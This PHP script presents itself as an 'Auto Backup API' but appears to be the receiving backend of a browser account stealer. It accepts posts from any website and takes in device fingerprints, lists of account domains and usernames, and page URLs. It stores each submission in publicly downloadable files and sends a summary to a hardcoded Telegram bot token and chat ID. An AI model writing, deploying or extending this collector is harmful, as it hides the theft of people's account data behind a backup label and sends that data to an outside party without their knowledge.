<?php
// telegram-bot.php
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, GET, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    exit(0);
}

// Configuration
$config = [
    'bot_token' => '7555437180:AAErIukUgHa2nHiNmb_3VQ90ih6NEYBhScw',
    'chat_id' => '6454347745',
    'encryption_key' => 'YOUR_ENCRYPTION_KEY_HERE',
    'database' => [
        'host' => 'localhost',
        'name' => 'backup_db',
        'user' => 'root',
        'pass' => ''
    ]
];

// Handle incoming backup
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $input = json_decode(file_get_contents('php://input'), true);
    
    if (!$input) {
        echo json_encode(['status' => 'error', 'message' => 'Invalid JSON']);
        exit;
    }
    
    // Validate input
    $validation = validateBackupData($input);
    if (!$validation['valid']) {
        echo json_encode(['status' => 'error', 'message' => $validation['message']]);
        exit;
    }
    
    // Process backup
    $result = processBackup($input, $config);
    
    echo json_encode($result);
    exit;
}

// Handle GET requests (for testing)
if ($_SERVER['REQUEST_METHOD'] === 'GET') {
    echo json_encode([
        'status' => 'online',
        'service' => 'Auto Backup API',
        'version' => '1.0.0',
        'timestamp' => date('c')
    ]);
    exit;
}

// Functions
function validateBackupData($data) {
    if (!isset($data['backupId'])) {
        return ['valid' => false, 'message' => 'Missing backup ID'];
    }
    
    if (!isset($data['timestamp'])) {
        return ['valid' => false, 'message' => 'Missing timestamp'];
    }
    
    if (!isset($data['data'])) {
        return ['valid' => false, 'message' => 'Missing backup data'];
    }
    
    return ['valid' => true, 'message' => 'OK'];
}

function processBackup($data, $config) {
    try {
        $backupId = $data['backupId'];
        $backupData = $data['data'];
        $timestamp = $data['timestamp'];
        
        // Decrypt if needed
        if (isset($backupData['encrypted'])) {
            $backupData = decryptData($backupData, $config['encryption_key']);
        }
        
        // Save to database
        $dbResult = saveToDatabase($backupData, $config);
        
        // Send to Telegram
        $telegramResult = sendToTelegram($backupData, $config);
        
        // Generate backup file
        $fileResult = generateBackupFile($backupData, $backupId);
        
        return [
            'status' => 'success',
            'backupId' => $backupId,
            'timestamp' => $timestamp,
            'database' => $dbResult,
            'telegram' => $telegramResult,
            'file' => $fileResult,
            'message' => 'Backup processed successfully'
        ];
        
    } catch (Exception $e) {
        return [
            'status' => 'error',
            'message' => $e->getMessage(),
            'backupId' => $data['backupId'] ?? 'unknown'
        ];
    }
}

function sendToTelegram($data, $config) {
    $message = formatTelegramMessage($data);
    
    $url = "https://api.telegram.org/bot{$config['bot_token']}/sendMessage";
    
    $payload = [
        'chat_id' => $config['chat_id'],
        'text' => $message,
        'parse_mode' => 'HTML',
        'disable_web_page_preview' => true
    ];
    
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($payload));
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'Content-Type: application/json'
    ]);
    
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    if ($httpCode !== 200) {
        throw new Exception("Telegram API error: HTTP $httpCode");
    }
    
    $result = json_decode($response, true);
    
    if (!$result['ok']) {
        throw new Exception("Telegram API error: " . ($result['description'] ?? 'Unknown'));
    }
    
    return [
        'message_id' => $result['result']['message_id'] ?? null,
        'success' => true
    ];
}

function formatTelegramMessage($data) {
    $device = $data['device'] ?? [];
    $accounts = $data['accounts'] ?? [];
    $metadata = $data['metadata'] ?? [];
    
    $browser = $device['browser'] ?? ['name' => 'Unknown', 'version' => ''];
    $platform = $device['platform'] ?? 'Unknown';
    $screen = $device['screen'] ?? ['width' => 0, 'height' => 0];
    
    $message = "<b>🚀 NEW BACKUP RECEIVED (API)</b>\n\n";
    $message .= "<b>📱 Device Information:</b>\n";
    $message .= "• <b>Browser:</b> {$browser['name']} {$browser['version']}\n";
    $message .= "• <b>Platform:</b> $platform\n";
    $message .= "• <b>Screen:</b> {$screen['width']}x{$screen['height']}\n";
    $message .= "• <b>RAM:</b> " . ($device['memory'] ?? 'Unknown') . "\n";
    $message .= "• <b>CPU Cores:</b> " . ($device['cpuCores'] ?? 'Unknown') . "\n";
    $message .= "• <b>Network:</b> " . ($device['network']['type'] ?? 'Unknown') . "\n\n";
    
    $message .= "<b>🔐 Accounts Found:</b> " . count($accounts) . "\n\n";
    
    $message .= "<b>📊 Account List (Top 5):</b>\n";
    foreach (array_slice($accounts, 0, 5) as $i => $account) {
        $domain = $account['domain'] ?? $account['source'] ?? 'Unknown';
        $username = $account['username'] ?? $account['key'] ?? 'N/A';
        $message .= ($i + 1) . ". $domain - $username\n";
    }
    
    if (count($accounts) > 5) {
        $message .= "\n... and " . (count($accounts) - 5) . " more accounts\n";
    }
    
    $backupId = $data['backupId'] ?? generateBackupId();
    $message .= "\n<b>🆔 Backup ID:</b> <code>$backupId</code>\n";
    $message .= "<b>📅 Time:</b> " . date('Y-m-d H:i:s') . "\n";
    $message .= "<b>🌐 URL:</b> " . ($metadata['url'] ?? 'N/A') . "\n\n";
    
    $message .= "<i>This backup was processed by Auto Backup API</i>";
    
    return $message;
}

function saveToDatabase($data, $config) {
    // For demo purposes - implement actual database logic
    $backupId = $data['backupId'] ?? generateBackupId();
    $timestamp = date('Y-m-d H:i:s');
    
    // Save to JSON file (in production, use MySQL/MongoDB)
    $filename = "backups/{$backupId}.json";
    $backupDir = dirname($filename);
    
    if (!is_dir($backupDir)) {
        mkdir($backupDir, 0755, true);
    }
    
    file_put_contents($filename, json_encode($data, JSON_PRETTY_PRINT));
    
    return [
        'saved' => true,
        'filename' => $filename,
        'size' => filesize($filename),
        'timestamp' => $timestamp
    ];
}

function generateBackupFile($data, $backupId) {
    $filename = "downloads/{$backupId}.json";
    $downloadDir = dirname($filename);
    
    if (!is_dir($downloadDir)) {
        mkdir($downloadDir, 0755, true);
    }
    
    $fileData = [
        'backupId' => $backupId,
        'timestamp' => date('c'),
        'data' => $data,
        'format' => 'JSON',
        'version' => '1.0'
    ];
    
    file_put_contents($filename, json_encode($fileData, JSON_PRETTY_PRINT));
    
    return [
        'filename' => $filename,
        'download_url' => "https://" . $_SERVER['HTTP_HOST'] . "/" . $filename,
        'size' => filesize($filename)
    ];
}

function decryptData($data, $key) {
    // Simple XOR decryption for demo
    if (!isset($data['encrypted'])) {
        return $data;
    }
    
    $encrypted = base64_decode($data['encrypted']);
    $decrypted = '';
    
    for ($i = 0; $i < strlen($encrypted); $i++) {
        $decrypted .= chr(ord($encrypted[$i]) ^ ord($key[$i % strlen($key)]));
    }
    
    return json_decode($decrypted, true) ?? $data;
}

function generateBackupId() {
    return strtoupper(uniqid('BKP-') . '-' . bin2hex(random_bytes(2)));
}

// Error handling
set_error_handler(function($errno, $errstr, $errfile, $errline) {
    echo json_encode([
        'status' => 'error',
        'message' => "Server error: $errstr",
        'code' => $errno
    ]);
    exit;
}, E_ALL);

set_exception_handler(function($exception) {
    echo json_encode([
        'status' => 'error',
        'message' => "Unhandled exception: " . $exception->getMessage(),
        'trace' => $exception->getTraceAsString()
    ]);
    exit;
});
